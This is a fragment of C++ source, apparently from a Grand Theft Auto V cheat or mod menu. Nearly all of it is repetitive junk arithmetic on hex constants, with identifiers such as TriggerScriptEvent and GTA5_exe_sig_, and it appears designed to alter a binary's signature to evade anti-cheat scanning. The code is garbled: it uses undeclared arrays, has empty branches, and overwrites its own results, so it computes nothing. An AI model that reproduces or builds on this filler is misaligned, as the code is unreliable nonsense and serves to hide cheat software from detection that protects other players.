				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<RoofState>0</RoofState>");
			Extern_Reader::LOG::LogSemHora("<SirenActive>false</SirenActive>");
			Extern_Reader::LOG::LogSemHora("<EngineOn>false</EngineOn>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
